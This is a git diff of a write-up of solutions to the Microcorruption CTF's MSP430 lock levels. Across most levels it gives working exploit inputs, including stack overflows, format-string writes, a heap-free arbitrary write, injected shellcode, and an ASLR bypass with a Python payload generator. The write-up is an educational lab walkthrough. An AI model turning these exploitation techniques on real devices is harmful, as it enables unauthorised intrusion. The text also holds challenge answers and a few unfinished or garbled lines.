@@ -8,7 +8,7 @@ If you are following along to learn, you should note that specific
 values throughout will vary between different users, so the solutions
 that work for me will often not work for you verbatim.
 
-## 1. New Orleans
+## 2. New Orleans
 
 Looking at the main function, we see it follows a simple flow: Create
 the password, whatever that means (at 0x443c), get the inputted
@@ -30,7 +30,7 @@ memory at that location:
 
 And behold, the password: `%u,jq8I`.
 
-## 2. Sydney
+## 3. Sydney
 
 Once again, the main function has a `check_password` call, so we start
 by looking at what `check_password` is doing.  We break at this
@@ -62,7 +62,7 @@ $ echo -e '\x72\x56\x2a\x49\x4b\x3a\x5b\x28'
 rV*IK:[(
 ```
 
-## 3. Hanoi
+## 4. Hanoi
 
 The input tells us that the password is 8-16 characters, so we start by inputting more, namely (in hex):
 
@@ -98,7 +98,7 @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac2
 
 Which opens the lock.
 
-## 4. Reykjavik
+## 5. Reykjavik
 
 The main function for this lock is small:
 
@@ -246,7 +246,7 @@ start of our password.  So perhaps a password of (in hex) simply
 
 Seems so.
 
-## 5. Cusco
+## 6. Cusco
 
 We once again try the same password: 
 
@@ -282,7 +282,7 @@ should get the door open:
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa4644
 ```
 
-## 6. Johannesburg
+## 7. Johannesburg
 
 Yet again, we try the password:
 
@@ -338,7 +338,7 @@ we're set:
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa04644
 ```
 
-## 7. Whitehorse
+## 8. Whitehorse
 
 As usual, starting out with a password of
 
@@ -385,7 +385,7 @@ the argument `0x007f`.  Thus our password will be:
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa32453c447f00
 ```
 
-## 8.  Santa Cruz
+## 9.  Santa Cruz
 
 This is an odd one.  It requires a username and password, both between 8 and 16 bytes.
 
@@ -470,7 +470,7 @@ cccccccccccccccccccccccccccccccccc
 ```
 
 
-## 9.  Addis Ababa
+## 10.  Addis Ababa
 
 This is the first one with printf--it requests our username/password
 combo as one string of the form `username:password` and will printf
@@ -549,7 +549,7 @@ The answer, therefore, is just:
 
 ```8c442578256e```
 
-## 10. Montevideo
+## 11. Montevideo
 
 This seems like a straightforward buffer overflow.  The usual
 procedure would be:
@@ -610,7 +610,7 @@ For a final answer of:
 ``` 3f40017f1f838f100f12b0124c45aaaaee43 ```
 
 
-## 11. Jakarta
+## 12. Jakarta
 
 The username and password are measured and the sum of their lengths
 ends up in r15.  Then, the following instruction is used to check that
@@ -650,7 +650,7 @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 a0a1a2a34c44a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebfbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
 ```
 
-## 12. Novosibirsk
+## 13. Novosibirsk
 
 This is another format string vulnerability, except now the code we
 want to get to execute is not present.  We can again use %n to get a
@@ -699,8 +699,354 @@ using:
 
 ```83ffc8442573256e```
 
+## 14. Algiers
 
-## 15. Lagos
+This is a malloc implementation. Here is the heap under normal
+circumstances after two mallocs of 16-byte blocks (starting at 240e
+and 2424 with 6-byte headers at the beginning and end of each block),
+all filled with the byte 0xaa repeated:
+
+```
+2400:   0824 0010 0000 0000 0824 1e24 2100 aaaa   .$.......$.$!...
+2410:   aaaa aaaa aaaa aaaa aaaa aaaa aaaa 0824   ...............$
+2420:   3424 2100 aaaa aaaa aaaa aaaa aaaa aaaa   4$!.............
+2430:   aaaa aaaa 1e24 0824 9c1f 0000 0000 0000   .....$.$........
+```
+
+And after the first free: 
+
+```
+2400:   0824 0010 0000 0000 0824 1e24 2100 aaaa   .$.......$.$!...
+2410:   aaaa aaaa aaaa aaaa aaaa aaaa aaaa 0824   ...............$
+2420:   0824 c21f aaaa aaaa aaaa aaaa aaaa aaaa   .$..............
+2430:   aaaa aaaa 1e24 0824 9c1f 0000 0000 0000   .....$.$........
+```
+
+So the free function uses the information in the headers to overwrite
+values in RAM (supposedly, the contents of other headers).  We control
+the headers, so maybe we can use this to get an arbitrary 1-word
+write.  
+
+We can overflow the heap with a password of `00` and the username:
+
+
+```
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa22203220
+```
+
+We note that this writes the value 0x2022 to the address 0x2032 (and
+also writes the value 0xc to the address 0x2026).
+
+On the other hand, the username:
+
+
+
+So it appears we can get an arbitrary one-word write with a username
+like:
+
+```{16 bytes of padding}{value to write}{address to write}```
+
+and a password of `00`.
+
+Inserting a breakpoint at the `ret` instruction of the `login`
+function, we see an `sp` value of 0x439a, so if we overwrite this
+address with the address of the `unlock_door` function, i.e. 0x4564,
+perhaps we can win.
+
+Thus:
+
+```
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa64459a43
+00
+```
+
+This works, except we notice that, as observed before, this also
+overwrites instructions near to 0x4564--in this case, instructions in
+the middle of the `unlock_door` function.
+
+So if we instead write the address of a function that calls the
+`unlock_door` function (in particular, one where we will not care
+about destroying nearby instructions), there might be success that
+way.  One such address is 0x4690.  So:
+
+```
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa90469a43
+00
+```
+
+However, for whatever reason, this (as well as using several other
+values for 0x4690) places in the address of the return pointer the
+value 0x241e instead of the expected 0x4690.  What made 0x4564 special
+such that this didn't happen is unclear, but for example, it seems to
+happen for any value other than those 0x455e to 0x4588.  This is
+likely a result of the details of the malloc implementation that we
+are trying still to treat as a black box.
+
+Since it is the free function that we are interested in, let us look
+into its behaviour a little.  It is somewhat short, so this won't be
+too painful:
+
+```
+4508:  0b12           push	r11
+450a:  3f50 faff      add	#0xfffa, r15
+450e:  1d4f 0400      mov	0x4(r15), r13
+4512:  3df0 feff      and	#0xfffe, r13
+4516:  8f4d 0400      mov	r13, 0x4(r15)
+451a:  2e4f           mov	@r15, r14
+451c:  1c4e 0400      mov	0x4(r14), r12
+4520:  1cb3           bit	#0x1, r12
+4522:  0d20           jnz	#0x453e <free+0x36>
+4524:  3c50 0600      add	#0x6, r12
+4528:  0c5d           add	r13, r12
+452a:  8e4c 0400      mov	r12, 0x4(r14)
+452e:  9e4f 0200 0200 mov	0x2(r15), 0x2(r14)
+4534:  1d4f 0200      mov	0x2(r15), r13
+4538:  8d4e 0000      mov	r14, 0x0(r13)
+453c:  2f4f           mov	@r15, r15
+453e:  1e4f 0200      mov	0x2(r15), r14
+4542:  1d4e 0400      mov	0x4(r14), r13
+4546:  1db3           bit	#0x1, r13
+4548:  0b20           jnz	#0x4560 <free+0x58>
+454a:  1d5f 0400      add	0x4(r15), r13
+454e:  3d50 0600      add	#0x6, r13
+4552:  8f4d 0400      mov	r13, 0x4(r15)
+4556:  9f4e 0200 0200 mov	0x2(r14), 0x2(r15)
+455c:  8e4f 0000      mov	r15, 0x0(r14)
+4560:  3b41           pop	r11
+4562:  3041           ret
+```
+
+Boiling this down, we find that if a heap entry's header consists of
+words X, Y, Z in that order for example, as a result of our input
+consisting of:
+
+```{16 bytes of padding}{X}{Y}{Z}```
+
+then the result will be (among others) the following writes to RAM:
+
+* Value X to address Y
+
+* Some value to address Y+2
+
+* Some value to address Y+4
+
+But only if the following conditions are met:
+
+* The value X must be even (required at instruction address 0x451c)
+
+* The values at address Y+2 and Y+4 must be even (tested at addresses
+  0x4522 and 0x4548).
+
+So we have a few possible targets for overwrite . Among others:
+
+* Overwrite the return address of some function with the address of
+  the `unlock_door` function.
+
+* Overwrite some instruction with an instruction that jumps to the
+  `unlock_door` function.
+
+* Overwrite some instruction with instructions that will unlock the
+  door.
+
+Considering option 2, we note with interest that the `unlock_door`
+function starts right after the `free` function, at address 0x4564.
+Further, we have a few addresses Y where Y, Y+2, and Y+4 all contain
+even values.  For example, 0x4556.  So we might overwrite address
+0x4556 with an instruction that jumps 14 bytes ahead: `jmp +0xe`, or,
+assembled, `063c`.  Thus we have a username input of: 
+
+```aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa063c5645```
+
+with blank password.
+
+## 15. Vladivostok
+
+This is an ASLR challenge.  A format string vulnerability can be used
+to leak an address, based on which we can calculate the offsets we
+need for overflow.
+
+We notice that the program code contains the `printf` function, and
+that it echoes the username we input, so we try a username of `%x%x`.
+Sure enough, this outputs
+
+```00007156```
+
+Between multiple runs, the first word remains 0000, but the second
+changes.  Could this be a fixed offset within the randomness that we
+can use to beat the ASLR?  
+
+The `main` function is:
+
+```
+4438 <main>
+4438:  b012 1c4a      call	#0x4a1c <rand>
+443c:  0b4f           mov	r15, r11
+443e:  3bf0 fe7f      and	#0x7ffe, r11
+4442:  3b50 0060      add	#0x6000, r11
+4446:  b012 1c4a      call	#0x4a1c <rand>
+444a:  0a4f           mov	r15, r10
+444c:  3012 0010      push	#0x1000
+4450:  3012 0044      push	#0x4400 <__init_stack>
+4454:  0b12           push	r11
+4456:  b012 e849      call	#0x49e8 <_memcpy>
+445a:  3150 0600      add	#0x6, sp
+445e:  0f4a           mov	r10, r15
+4460:  3ff0 fe0f      and	#0xffe, r15
+4464:  0e4b           mov	r11, r14
+4466:  0e8f           sub	r15, r14
+4468:  3e50 00ff      add	#0xff00, r14
+446c:  0d4b           mov	r11, r13
+446e:  3d50 5c03      add	#0x35c, r13
+4472:  014e           mov	r14, sp
+4474:  0f4b           mov	r11, r15
+4476:  8d12           call	r13
+```
+
+At 0x4456, r11 will contain the address where the code will be moved.
+At 0x4472, r14 will contain the new address of the top of the stack.
+
+We will run through the program once, leaking an address using the
+username `%x%x`, but breaking at these two addresses we will compare
+to see what we are actually getting:
+
+* Run 1:
+  * Code address: 0xbe8c
+  * Stack address: 0xbac2
+  * Leaked address: 0xc1f6
+  
+* Run 2:
+  * Code address: 0x9b98
+  * Stack address: 0x99d4
+  * Leaked address: 0x9f02
+
+In both cases, the leaked address is 874 after the start of the code
+address.  So for our password input we can always compute the code
+address.  
+
+Let us start a new run, pick up the randomised addresses, and then
+test for overflow:
+
+* Code address: 0x9370
+* Stack address: 0x8b60
+* Leaked address: 0x96da
+
+
+
+Now, we test for buffer overflow in the password with the following
+password input:
+
+ABACADAEAFAGAHAIAJAKALAMANAOAPAQARASATAUAV
+
+We step through until the main function returns, and behold that `pc`
+gets set to 0x4641, or AF.  Thus we get control of the return address
+by inputting a password like:
+
+```{8 byte padding}{return address}```
+
+However, this is one of those example with no `unlock_door` function,
+so we cannot simply return to the code that does what we want.  So we
+have two choices:
+
+* Look for ROP gadgets to do the job
+
+* Find another way to jump to the stack to run code there.  However,
+  at the moment after this return, we have the registers set up thus:
+
+```
+pc  4641  sp  8b5e  sr  0004  cg  0000
+r04 0000  r05 5a08  r06 0000  r07 0000
+r08 0000  r09 0000  r10 4441  r11 4541
+r12 0000  r13 000a  r14 8b52  r15 8b52
+```
+
+So we notice that in fact r14 is an address on the stack!  So if we
+want to get code running on the stack, we can jump back to the `call
+r14` instruction in `aslr_main` (which, presumably, we can compute the
+address for, since we know the start of the copied code).  This will
+jump us back to just before our password, which currently looks like:
+
+```
+8b50:   0000 da96 4142 4143 4144 4145 4146 4147   ....ABACADAEAFAG
+8b60:   4148 4149 414a 414b 0000 0000 0000 0000   AHAIAJAK........
+```
+
+So we can put code as the first 8 bytes of the password.  For example: 
+
+```
+mov #0x7f,r15
+jmp [address of INT code]
+```
+
+i.e.:
+
+```3f407f003040[address of INT]```
+
+For a final username/password combo of:
+
+```
+%x%x
+3f407f003040[address of INT][address of call r14]
+```
+
+Now, we can compute: the address of `call r14` within the unrandomised code is:
+
+```
+4762:  8e12           call	r14
+```
+
+That is, at an offset 0x362 from the start of the code.
+
+And the interrupt-making code we want to run is: 
+
+```
+4912:  8f10           swpb	r15
+4914:  024f           mov	r15, sr
+4916:  32d0 0080      bis	#0x8000, sr
+491a:  b012 1000      call	#0x10
+```
+
+That is, an offset 0x512 from the start of the code.  
+
+Then, since the leaked address is always an offset of 874=0x36a from
+the start of the code, we will do:
+
+```30127f00b012{leaked - 0x36a + 0x362}{leaked - 0x36a + 0x512}```
+
+This we can get by:
+
+```
+import sys
+leaked = int(sys.argv[1],16)
+call_r14 = "%04x"%(leaked - 8)
+int_addr = "%04x"%(leaked + 0x1a8)
+call_r14 = call_r14[2:4] + call_r14[0:2]
+int_addr = int_addr[2:4] + int_addr[0:2]
+print("3f407f003040" + int_addr + call_r14)
+```
+
+Thus, on an actual run, we enter the username:
+
+```%x%x```
+
+Which gives an output of:
+
+```0000a726```
+
+Then:
+
+```
+$ python vlad.py a726
+3f407f003040cea81ea7
+```
+
+So we enter a password of 
+
+```3f407f003040cea81ea7```
+
+which unlocks the door!
+
+
+## 16. Lagos
 
 This is a relatively straightforward buffer overflow except that we
 are only allowed alphanumeric instructions.
@@ -769,7 +1115,7 @@ Then on the second prompt, we can put in the code we want to execute:
 
 ```30127f00b012fc45```
 
-## 16. Bangalore
+## 17. Bangalore
 
 This challenge involves beating DEP.  It is a relatively
 straightforward buffer overflow otherwise: We provide the input:
@@ -824,142 +1170,8 @@ Since the start of the stack is 3fee, we have:
 ```324000ffb01210004141414141414141ba443f000000ee3f```
 
 
-# Writeups in progress:
+# Levels in progress
 
+## 18. Chernobyl
 
-## 13. Algiers
-
-This is a malloc implementation. Here is the heap under normal
-circumstances after two mallocs of 16-byte blocks (starting at 240e
-and 2424 with 6-byte headers at the beginning and end of each block),
-all filled with the byte 0xaa repeated:
-
-```
-2400:   0824 0010 0000 0000 0824 1e24 2100 aaaa   .$.......$.$!...
-2410:   aaaa aaaa aaaa aaaa aaaa aaaa aaaa 0824   ...............$
-2420:   3424 2100 aaaa aaaa aaaa aaaa aaaa aaaa   4$!.............
-2430:   aaaa aaaa 1e24 0824 9c1f 0000 0000 0000   .....$.$........
-
-```
-
-And after the first free: 
-
-```
-2400:   0824 0010 0000 0000 0824 1e24 2100 aaaa   .$.......$.$!...
-2410:   aaaa aaaa aaaa aaaa aaaa aaaa aaaa 0824   ...............$
-2420:   0824 c21f aaaa aaaa aaaa aaaa aaaa aaaa   .$..............
-2430:   aaaa aaaa 1e24 0824 9c1f 0000 0000 0000   .....$.$........
-```
-
-So the free function uses the information in the headers to overwrite
-values in RAM (supposedly, the contents of other headers).  We control
-the headers, so maybe we can use this to get an arbitrary 1-word
-write.  
-
-We can overflow the heap with inputs:
-
-```
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa02b202c202d2
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa04b404c404d4
-```
-
-This way, all the headers that we can overwrite get overwritten with
-distinct values, so that as the free function runs, we can tell which
-pieces of which headers are being used in the various  write into RAM.
-
-The free function has a few instructions that write to RAM.  We break
-at each one and examine what it is doing.  
-
-Following these, we find: 
-
-```
-[b206] gets overwritten with d20e
-[c202] gets overwritten with b202
-```
-
-If we're going to target a single word for an overwrite, it is the
-value of sp when the free function returns, i.e. `4394`, and we will
-overwrite this with the address of the `unlock_door` function,
-i.e. `4564`.
-
-Seemingly, we can do this by doing: 
-
-```
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa904300086045
-aa
-```
-
-This appears to overwrite the sp with ffff, so we try: 
-
-
-```
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa924300006445
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa08243e242100
-```
-
-## 14. Vladivostok
-
-This is an ASLR challenge.  A format string vulnerability can be used
-to leak an address, based on which we can calculate the offsets we
-need for overflow.
-
-```0xcaaa-0xc740 = 874 = 0x36a```
-
-```
-0xcaaa-0xc740 = 874 = 0x36a
-
-pc  df0c  sp  d75a  sr  0004  cg  0000
-r04 0000  r05 5a08  r06 0000  r07 0000
-r08 0000  r09 0000  r10 4343  r11 4444
-r12 0000  r13 000a  r14 d750  r15 d750
-
-3041
-ret
-
-d720:   0000 0000 5ce0 0000 4ce0 0000 3000 0000   ....\...L...0...
-d730:   0000 1cdf 0000 0000 0000 3ad7 0000 0000   ..........:.....
-d740:   0000 fade 0300 eade 0000 0a00 50d7 0000   ............P...
-d750:   1cdf 4141 4242 4343 4444 4545 4646 4747   ..AABBCCDDEEFFGG
-d760:   4848 4949 4a4a 0000 0000 0000 0000 0000   HHIIJJ..........
-
-4762:  8e12           call	r14
-45e4:  8c12           call	r12
-
-4242424242424242[call_r14]30127f00b012[int]
-
-
-
-call_r14 = leaked - 0x36a + 0x362 = leaked - 0x8
-int = leaked - 1284 = leaked - 0x504
-
-leaked - 0x36a + 4912 - 4400
-
-leaked = 9b48
-call_r14 = 9b40
-int = ...
-
-4242424242424242409b30127f00b012cdab
-```
-
-```
-leaked = d538
-call_r14 = d530
-int = d02c
-424242424242424230d430127; f00b0122cd0
-```
-
-as determined by: 
-
-```
-import sys
-leaked = int(sys.argv[1],16)
-call_r14 = "%04x"%(leaked - 8)
-int_addr = "%04x"%(leaked + 0x1a8)
-call_r14 = call_r14[2:4] + call_r14[0:2]
-int_addr = int_addr[2:4] + int_addr[0:2]
-print("4242424242424242" + call_r14 + "3f407f003040" + int_addr)
-```
-
-
-
-## 17. Chernobyl
+## 19. ???
